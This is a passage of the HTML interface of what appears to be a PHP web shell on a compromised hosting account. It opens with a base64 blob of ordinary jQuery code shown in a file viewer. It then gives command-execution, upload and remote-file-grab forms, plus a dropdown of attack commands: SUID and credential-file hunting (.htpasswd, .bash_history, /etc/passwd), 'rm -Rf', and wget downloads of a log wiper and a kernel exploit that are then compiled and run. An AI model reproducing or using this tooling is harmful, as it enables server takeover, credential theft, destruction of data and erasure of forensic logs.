cHJvcGVydHkgdG8gYmxvY2sgZm9yIGhlaWdodC93aWR0aCBhbmltYXRpb25zCgkJaWYgKCB0aGlzLnByb3AgPT0gImhlaWdodCIgfHwgdGhpcy5wcm9wID09ICJ3aWR0aCIgKQoJCQl0aGlzLmVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Cgl9LAoKCS8vIEdldCB0aGUgY3VycmVudCBzaXplCgljdXI6IGZ1bmN0aW9uKGZvcmNlKXsKCQlpZiAoIHRoaXMuZWxlbVt0aGlzLnByb3BdICE9IG51bGwgJiYgdGhpcy5lbGVtLnN0eWxlW3RoaXMucHJvcF0gPT0gbnVsbCApCgkJCXJldHVybiB0aGlzLmVsZW1bIHRoaXMucHJvcCBdOwoKCQl2YXIgciA9IHBhcnNlRmxvYXQoalF1ZXJ5LmNzcyh0aGlzLmVsZW0sIHRoaXMucHJvcCwgZm9yY2UpKTsKCQlyZXR1cm4gciAmJiByID4gLTEwMDAwID8gciA6IHBhcnNlRmxvYXQoalF1ZXJ5LmN1ckNTUyh0aGlzLmVsZW0sIHRoaXMucHJvcCkpIHx8IDA7Cgl9LAoKCS8vIFN0YXJ0IGFuIGFuaW1hdGlvbiBmcm9tIG9uZSBudW1iZXIgdG8gYW5vdGhlcgoJY3VzdG9tOiBmdW5jdGlvbihmcm9tLCB0bywgdW5pdCl7CgkJdGhpcy5zdGFydFRpbWUgPSAobmV3IERhdGUoKSkuZ2V0VGltZSgpOwoJCXRoaXMuc3RhcnQgPSBmcm9tOwoJCXRoaXMuZW5kID0gdG87CgkJdGhpcy51bml0ID0gdW5pdCB8fCB0aGlzLnVuaXQgfHwgInB4IjsKCQl0aGlzLm5vdyA9IHRoaXMuc3RhcnQ7CgkJdGhpcy5wb3MgPSB0aGlzLnN0YXRlID0gMDsKCQl0aGlzLnVwZGF0ZSgpOwoKCQl2YXIgc2VsZiA9IHRoaXM7CgkJZnVuY3Rpb24gdChnb3RvRW5kKXsKCQkJcmV0dXJuIHNlbGYuc3RlcChnb3RvRW5kKTsKCQl9CgoJCXQuZWxlbSA9IHRoaXMuZWxlbTsKCgkJalF1ZXJ5LnRpbWVycy5wdXNoKHQpOwoKCQlpZiAoIGpRdWVyeS50aW1lcklkID09IG51bGwgKSB7CgkJCWpRdWVyeS50aW1lcklkID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKCQkJCXZhciB0aW1lcnMgPSBqUXVlcnkudGltZXJzOwoJCQkJCgkJCQlmb3IgKCB2YXIgaSA9IDA7IGkgPCB0aW1lcnMubGVuZ3RoOyBpKysgKQoJCQkJCWlmICggIXRpbWVyc1tpXSgpICkKCQkJCQkJdGltZXJzLnNwbGljZShpLS0sIDEpOwoKCQkJCWlmICggIXRpbWVycy5sZW5ndGggKSB7CgkJCQkJY2xlYXJJbnRlcnZhbCggalF1ZXJ5LnRpbWVySWQgKTsKCQkJCQlqUXVlcnkudGltZXJJZCA9IG51bGw7CgkJCQl9CgkJCX0sIDEzKTsKCQl9Cgl9LAoKCS8vIFNpbXBsZSAnc2hvdycgZnVuY3Rpb24KCXNob3c6IGZ1bmN0aW9uKCl7CgkJLy8gUmVtZW1iZXIgd2hlcmUgd2Ugc3RhcnRlZCwgc28gdGhhdCB3ZSBjYW4gZ28gYmFjayB0byBpdCBsYXRlcgoJCXRoaXMub3B0aW9ucy5vcmlnW3RoaXMucHJvcF0gPSBqUXVlcnkuYXR0ciggdGhpcy5lbGVtLnN0eWxlLCB0aGlzLnByb3AgKTsKCQl0aGlzLm9wdGlvbnMuc2hvdyA9IHRydWU7CgoJCS8vIEJlZ2luIHRoZSBhbmltYXRpb24KCQl0aGlzLmN1c3RvbSgwLCB0aGlzLmN1cigpKTsKCgkJLy8gTWFrZSBzdXJlIHRoYXQgd2Ugc3RhcnQgYXQgYSBzbWFsbCB3aWR0aC9oZWlnaHQgdG8gYXZvaWQgYW55CgkJLy8gZmxhc2ggb2YgY29udGVudAoJCWlmICggdGhpcy5wcm9wID09ICJ3aWR0aCIgfHwgdGhpcy5wcm9wID09ICJoZWlnaHQiICkKCQkJdGhpcy5lbGVtLnN0eWxlW3RoaXMucHJvcF0gPSAiMXB4IjsKCQkKCQkvLyBTdGFydCBieSBzaG93aW5nIHRoZSBlbGVtZW50CgkJalF1ZXJ5KHRoaXMuZWxlbSkuc2hvdygpOwoJfSwKCgkvLyBTaW1wbGUgJ2hpZGUnIGZ1bmN0aW9uCgloaWRlOiBmdW5jdGlvbigpewoJCS8vIFJlbWVtYmVyIHdoZXJlIHdlIHN0YXJ0ZWQsIHNvIHRoYXQgd2UgY2FuIGdvIGJhY2sgdG8gaXQgbGF0ZXIKCQl0aGlzLm9wdGlvbnMub3JpZ1t0aGlzLnByb3BdID0galF1ZXJ5LmF0dHIoIHRoaXMuZWxlbS5zdHlsZSwgdGhpcy5wcm9wICk7CgkJdGhpcy5vcHRpb25zLmhpZGUgPSB0cnVlOwoKCQkvLyBCZWdpbiB0aGUgYW5pbWF0aW9uCgkJdGhpcy5jdXN0b20odGhpcy5jdXIoKSwgMCk7Cgl9LAoKCS8vIEVhY2ggc3RlcCBvZiBhbiBhbmltYXRpb24KCXN0ZXA6IGZ1bmN0aW9uKGdvdG9FbmQpewoJCXZhciB0ID0gKG5ldyBEYXRlKCkpLmdldFRpbWUoKTsKCgkJaWYgKCBnb3RvRW5kIHx8IHQgPiB0aGlzLm9wdGlvbnMuZHVyYXRpb24gKyB0aGlzLnN0YXJ0VGltZSApIHsKCQkJdGhpcy5ub3cgPSB0aGlzLmVuZDsKCQkJdGhpcy5wb3MgPSB0aGlzLnN0YXRlID0gMTsKCQkJdGhpcy51cGRhdGUoKTsKCgkJCXRoaXMub3B0aW9ucy5jdXJBbmltWyB0aGlzLnByb3AgXSA9IHRydWU7CgoJCQl2YXIgZG9uZSA9IHRydWU7CgkJCWZvciAoIHZhciBpIGluIHRoaXMub3B0aW9ucy5jdXJBbmltICkKCQkJCWlmICggdGhpcy5vcHRpb25zLmN1ckFuaW1baV0gIT09IHRydWUgKQoJCQkJCWRvbmUgPSBmYWxzZTsKCgkJCWlmICggZG9uZSApIHsKCQkJCWlmICggdGhpcy5vcHRpb25zLmRpc3BsYXkgIT0gbnVsbCApIHsKCQkJCQkvLyBSZXNldCB0aGUgb3ZlcmZsb3cKCQkJCQl0aGlzLmVsZW0uc3R5bGUub3ZlcmZsb3cgPSB0aGlzLm9wdGlvbnMub3ZlcmZsb3c7CgkJCQkKCQkJCQkvLyBSZXNldCB0aGUgZGlzcGxheQoJCQkJCXRoaXMuZWxlbS5zdHlsZS5kaXNwbGF5ID0gdGhpcy5vcHRpb25zLmRpc3BsYXk7CgkJCQkJaWYgKCBqUXVlcnkuY3NzKHRoaXMuZWxlbSwgImRpc3BsYXkiKSA9PSAibm9uZSIgKQoJCQkJCQl0aGlzLmVsZW0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CgkJCQl9CgoJCQkJLy8gSGlkZSB0aGUgZWxlbWVudCBpZiB0aGUgImhpZGUiIG9wZXJhdGlvbiB3YXMgZG9uZQoJCQkJaWYgKCB0aGlzLm9wdGlvbnMuaGlkZSApCgkJCQkJdGhpcy5lbGVtLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CgoJCQkJLy8gUmVzZXQgdGhlIHByb3BlcnRpZXMsIGlmIHRoZSBpdGVtIGhhcyBiZWVuIGhpZGRlbiBvciBzaG93bgoJCQkJaWYgKCB0aGlzLm9wdGlvbnMuaGlkZSB8fCB0aGlzLm9wdGlvbnMuc2hvdyApCgkJCQkJZm9yICggdmFyIHAgaW4gdGhpcy5vcHRpb25zLmN1ckFuaW0gKQoJCQkJCQlqUXVlcnkuYXR0cih0aGlzLmVsZW0uc3R5bGUsIHAsIHRoaXMub3B0aW9ucy5vcmlnW3BdKTsKCQkJfQoKCQkJLy8gSWYgYSBjYWxsYmFjayB3YXMgcHJvdmlkZWQsIGV4ZWN1dGUgaXQKCQkJaWYgKCBkb25lICYmIGpRdWVyeS5pc0Z1bmN0aW9uKCB0aGlzLm9wdGlvbnMuY29tcGxldGUgKSApCgkJCQkvLyBFeGVjdXRlIHRoZSBjb21wbGV0ZSBmdW5jdGlvbgoJCQkJdGhpcy5vcHRpb25zLmNvbXBsZXRlLmFwcGx5KCB0aGlzLmVsZW0gKTsKCgkJCXJldHVybiBmYWxzZTsKCQl9IGVsc2UgewoJCQl2YXIgbiA9IHQgLSB0aGlzLnN0YXJ0VGltZTsKCQkJdGhpcy5zdGF0ZSA9IG4gLyB0aGlzLm9wdGlvbnMuZHVyYXRpb247CgoJCQkvLyBQZXJmb3JtIHRoZSBlYXNpbmcgZnVuY3Rpb24sIGRlZmF1bHRzIHRvIHN3aW5nCgkJCXRoaXMucG9zID0galF1ZXJ5LmVhc2luZ1t0aGlzLm9wdGlvbnMuZWFzaW5nIHx8IChqUXVlcnkuZWFzaW5nLnN3aW5nID8gInN3aW5nIiA6ICJsaW5lYXIiKV0odGhpcy5zdGF0ZSwgbiwgMCwgMSwgdGhpcy5vcHRpb25zLmR1cmF0aW9uKTsKCQkJdGhpcy5ub3cgPSB0aGlzLnN0YXJ0ICsgKCh0aGlzLmVuZCAtIHRoaXMuc3RhcnQpICogdGhpcy5wb3MpOwoKCQkJLy8gUGVyZm9ybSB0aGUgbmV4dCBzdGVwIG9mIHRoZSBhbmltYXRpb24KCQkJdGhpcy51cGRhdGUoKTsKCQl9CgoJCXJldHVybiB0cnVlOwoJfQoKfTsKCmpRdWVyeS5meC5zdGVwID0gewoJc2Nyb2xsTGVmdDogZnVuY3Rpb24oZngpewoJCWZ4LmVsZW0uc2Nyb2xsTGVmdCA9IGZ4Lm5vdzsKCX0sCgoJc2Nyb2xsVG9wOiBmdW5jdGlvbihmeCl7CgkJZnguZWxlbS5zY3JvbGxUb3AgPSBmeC5ub3c7Cgl9LAoKCW9wYWNpdHk6IGZ1bmN0aW9uKGZ4KXsKCQlqUXVlcnkuYXR0cihmeC5lbGVtLnN0eWxlLCAib3BhY2l0eSIsIGZ4Lm5vdyk7Cgl9LAoKCV9kZWZhdWx0OiBmdW5jdGlvbihmeCl7CgkJZnguZWxlbS5zdHlsZVsgZngucHJvcCBdID0gZngubm93ICsgZngudW5pdDsKCX0KfTsKLy8gVGhlIE9mZnNldCBNZXRob2QKLy8gT3JpZ2luYWxseSBCeSBCcmFuZG9uIEFhcm9uLCBwYXJ0IG9mIHRoZSBEaW1lbnNpb24gUGx1Z2luCi8vIGh0dHA6Ly9qcXVlcnkuY29tL3BsdWdpbnMvcHJvamVjdC9kaW1lbnNpb25zCmpRdWVyeS5mbi5vZmZzZXQgPSBmdW5jdGlvbigpIHsKCXZhciBsZWZ0ID0gMCwgdG9wID0gMCwgZWxlbSA9IHRoaXNbMF0sIHJlc3VsdHM7CgkKCWlmICggZWxlbSApIHdpdGggKCBqUXVlcnkuYnJvd3NlciApIHsKCQl2YXIgcGFyZW50ICAgICAgID0gZWxlbS5wYXJlbnROb2RlLCAKCQkgICAgb2Zmc2V0Q2hpbGQgID0gZWxlbSwKCQkgICAgb2Zmc2V0UGFyZW50ID0gZWxlbS5vZmZzZXRQYXJlbnQsIAoJCSAgICBkb2MgICAgICAgICAgPSBlbGVtLm93bmVyRG9jdW1lbnQsCgkJICAgIHNhZmFyaTIgICAgICA9IHNhZmFyaSAmJiBwYXJzZUludCh2ZXJzaW9uKSA8IDUyMiwKCQkgICAgZml4ZWQgICAgICAgID0galF1ZXJ5LmNzcyhlbGVtLCAicG9zaXRpb24iKSA9PSAiZml4ZWQiOwoJCgkJLy8gVXNlIGdldEJvdW5kaW5nQ2xpZW50UmVjdCBpZiBhdmFpbGFibGUKCQlpZiAoIGVsZW0uZ2V0Qm91bmRpbmdDbGllbnRSZWN0ICkgewoJCQl2YXIgYm94ID0gZWxlbS5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTsKCQkKCQkJLy8gQWRkIHRoZSBkb2N1bWVudCBzY3JvbGwgb2Zmc2V0cwoJCQlhZGQoYm94LmxlZnQgKyBNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbExlZnQsIGRvYy5ib2R5LnNjcm9sbExlZnQpLAoJCQkJYm94LnRvcCAgKyBNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCwgIGRvYy5ib2R5LnNjcm9sbFRvcCkpOwoJCQoJCQkvLyBJRSBhZGRzIHRoZSBIVE1MIGVsZW1lbnQncyBib3JkZXIsIGJ5IGRlZmF1bHQgaXQgaXMgbWVkaXVtIHdoaWNoIGlzIDJweAoJCQkvLyBJRSA2IGFuZCA3IHF1aXJrcyBtb2RlIHRoZSBib3JkZXIgd2lkdGggaXMgb3ZlcndyaXRhYmxlIGJ5IHRoZSBmb2xsb3dpbmcgY3NzIGh0bWwgeyBib3JkZXI6IDA7IH0KCQkJLy8gSUUgNyBzdGFuZGFyZHMgbW9kZSwgdGhlIGJvcmRlciBpcyBhbHdheXMgMnB4CgkJCS8vIFRoaXMgYm9yZGVyL29mZnNldCBpcyB0eXBpY2FsbHkgcmVwcmVzZW50ZWQgYnkgdGhlIGNsaWVudExlZnQgYW5kIGNsaWVudFRvcCBwcm9wZXJ0aWVzCgkJCS8vIEhvd2V2ZXIsIGluIElFNiBhbmQgNyBxdWlya3MgbW9kZSB0aGUgY2xpZW50TGVmdCBhbmQgY2xpZW50VG9wIHByb3BlcnRpZXMgYXJlIG5vdCB1cGRhdGVkIHdoZW4gb3ZlcndyaXRpbmcgaXQgdmlhIENTUwoJCQkvLyBUaGVyZWZvcmUgdGhpcyBtZXRob2Qgd2lsbCBiZSBvZmYgYnkgMnB4IGluIElFIHdoaWxlIGluIHF1aXJrc21vZGUKCQkJYWRkKCAtZG9jLmRvY3VtZW50RWxlbWVudC5jbGllbnRMZWZ0LCAtZG9jLmRvY3VtZW50RWxlbWVudC5jbGllbnRUb3AgKTsKCQoJCS8vIE90aGVyd2lzZSBsb29wIHRocm91Z2ggdGhlIG9mZnNldFBhcmVudHMgYW5kIHBhcmVudE5vZGVzCgkJfSBlbHNlIHsKCQkKCQkJLy8gSW5pdGlhbCBlbGVtZW50IG9mZnNldHMKCQkJYWRkKCBlbGVtLm9mZnNldExlZnQsIGVsZW0ub2Zmc2V0VG9wICk7CgkJCQoJCQkvLyBHZXQgcGFyZW50IG9mZnNldHMKCQkJd2hpbGUgKCBvZmZzZXRQYXJlbnQgKSB7CgkJCQkvLyBBZGQgb2Zmc2V0UGFyZW50IG9mZnNldHMKCQkJCWFkZCggb2Zmc2V0UGFyZW50Lm9mZnNldExlZnQsIG9mZnNldFBhcmVudC5vZmZzZXRUb3AgKTsKCQkJCgkJCQkvLyBNb3ppbGxhIGFuZCBTYWZhcmkgPiAyIGRvZXMgbm90IGluY2x1ZGUgdGhlIGJvcmRlciBvbiBvZmZzZXQgcGFyZW50cwoJCQkJLy8gSG93ZXZlciBNb3ppbGxhIGFkZHMgdGhlIGJvcmRlciBmb3IgdGFibGUgb3IgdGFibGUgY2VsbHMKCQkJCWlmICggbW96aWxsYSAmJiAhL150KGFibGV8ZHxoKSQvaS50ZXN0KG9mZnNldFBhcmVudC50YWdOYW1lKSB8fCBzYWZhcmkgJiYgIXNhZmFyaTIgKQoJCQkJCWJvcmRlciggb2Zmc2V0UGFyZW50ICk7CgkJCQkJCgkJCQkvLyBBZGQgdGhlIGRvY3VtZW50IHNjcm9sbCBvZmZzZXRzIGlmIHBvc2l0aW9uIGlzIGZpeGVkIG9uIGFueSBvZmZzZXRQYXJlbnQKCQkJCWlmICggIWZpeGVkICYmIGpRdWVyeS5jc3Mob2Zmc2V0UGFyZW50LCAicG9zaXRpb24iKSA9PSAiZml4ZWQiICkKCQkJCQlmaXhlZCA9IHRydWU7CgkJCQoJCQkJLy8gU2V0IG9mZnNldENoaWxkIHRvIHByZXZpb3VzIG9mZnNldFBhcmVudCB1bmxlc3MgaXQgaXMgdGhlIGJvZHkgZWxlbWVudAoJCQkJb2Zmc2V0Q2hpbGQgID0gL15ib2R5JC9pLnRlc3Qob2Zmc2V0UGFyZW50LnRhZ05hbWUpID8gb2Zmc2V0Q2hpbGQgOiBvZmZzZXRQYXJlbnQ7CgkJCQkvLyBHZXQgbmV4dCBvZmZzZXRQYXJlbnQKCQkJCW9mZnNldFBhcmVudCA9IG9mZnNldFBhcmVudC5vZmZzZXRQYXJlbnQ7CgkJCX0KCQkKCQkJLy8gR2V0IHBhcmVudCBzY3JvbGwgb2Zmc2V0cwoJCQl3aGlsZSAoIHBhcmVudCAmJiBwYXJlbnQudGFnTmFtZSAmJiAhL15ib2R5fGh0bWwkL2kudGVzdChwYXJlbnQudGFnTmFtZSkgKSB7CgkJCQkvLyBSZW1vdmUgcGFyZW50IHNjcm9sbCBVTkxFU1MgdGhhdCBwYXJlbnQgaXMgaW5saW5lIG9yIGEgdGFibGUgdG8gd29yayBhcm91bmQgT3BlcmEgaW5saW5lL3RhYmxlIHNjcm9sbExlZnQvVG9wIGJ1ZwoJCQkJaWYgKCAhL15pbmxpbmV8dGFibGUuKiQvaS50ZXN0KGpRdWVyeS5jc3MocGFyZW50LCAiZGlzcGxheSIpKSApCgkJCQkJLy8gU3VidHJhY3QgcGFyZW50IHNjcm9sbCBvZmZzZXRzCgkJCQkJYWRkKCAtcGFyZW50LnNjcm9sbExlZnQsIC1wYXJlbnQuc2Nyb2xsVG9wICk7CgkJCQoJCQkJLy8gTW96aWxsYSBkb2VzIG5vdCBhZGQgdGhlIGJvcmRlciBmb3IgYSBwYXJlbnQgdGhhdCBoYXMgb3ZlcmZsb3cgIT0gdmlzaWJsZQoJCQkJaWYgKCBtb3ppbGxhICYmIGpRdWVyeS5jc3MocGFyZW50LCAib3ZlcmZsb3ciKSAhPSAidmlzaWJsZSIgKQoJCQkJCWJvcmRlciggcGFyZW50ICk7CgkJCQoJCQkJLy8gR2V0IG5leHQgcGFyZW50CgkJCQlwYXJlbnQgPSBwYXJlbnQucGFyZW50Tm9kZTsKCQkJfQoJCQoJCQkvLyBTYWZhcmkgPD0gMiBkb3VibGVzIGJvZHkgb2Zmc2V0cyB3aXRoIGEgZml4ZWQgcG9zaXRpb24gZWxlbWVudC9vZmZzZXRQYXJlbnQgb3IgYWJzb2x1dGVseSBwb3NpdGlvbmVkIG9mZnNldENoaWxkCgkJCS8vIE1vemlsbGEgZG91YmxlcyBib2R5IG9mZnNldHMgd2l0aCBhIG5vbi1hYnNvbHV0ZWx5IHBvc2l0aW9uZWQgb2Zmc2V0Q2hpbGQKCQkJaWYgKCAoc2FmYXJpMiAmJiAoZml4ZWQgfHwgalF1ZXJ5LmNzcyhvZmZzZXRDaGlsZCwgInBvc2l0aW9uIikgPT0gImFic29sdXRlIikpIHx8IAoJCQkJKG1vemlsbGEgJiYgalF1ZXJ5LmNzcyhvZmZzZXRDaGlsZCwgInBvc2l0aW9uIikgIT0gImFic29sdXRlIikgKQoJCQkJCWFkZCggLWRvYy5ib2R5Lm9mZnNldExlZnQsIC1kb2MuYm9keS5vZmZzZXRUb3AgKTsKCQkJCgkJCS8vIEFkZCB0aGUgZG9jdW1lbnQgc2Nyb2xsIG9mZnNldHMgaWYgcG9zaXRpb24gaXMgZml4ZWQKCQkJaWYgKCBmaXhlZCApCgkJCQlhZGQoTWF0aC5tYXgoZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0LCBkb2MuYm9keS5zY3JvbGxMZWZ0KSwKCQkJCQlNYXRoLm1heChkb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbFRvcCwgIGRvYy5ib2R5LnNjcm9sbFRvcCkpOwoJCX0KCgkJLy8gUmV0dXJuIGFuIG9iamVjdCB3aXRoIHRvcCBhbmQgbGVmdCBwcm9wZXJ0aWVzCgkJcmVzdWx0cyA9IHsgdG9wOiB0b3AsIGxlZnQ6IGxlZnQgfTsKCX0KCglmdW5jdGlvbiBib3JkZXIoZWxlbSkgewoJCWFkZCggalF1ZXJ5LmN1ckNTUyhlbGVtLCAiYm9yZGVyTGVmdFdpZHRoIiwgdHJ1ZSksIGpRdWVyeS5jdXJDU1MoZWxlbSwgImJvcmRlclRvcFdpZHRoIiwgdHJ1ZSkgKTsKCX0KCglmdW5jdGlvbiBhZGQobCwgdCkgewoJCWxlZnQgKz0gcGFyc2VJbnQobCkgfHwgMDsKCQl0b3AgKz0gcGFyc2VJbnQodCkgfHwgMDsKCX0KCglyZXR1cm4gcmVzdWx0czsKfTsKfSkoKTsK</textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=jquery-latest.js&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Full</a>] [<a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Preview</a>]<br><b>Base64: </b>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Encode</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk+quotes</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Decode</a>]&nbsp;</nobr>\n<P>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input 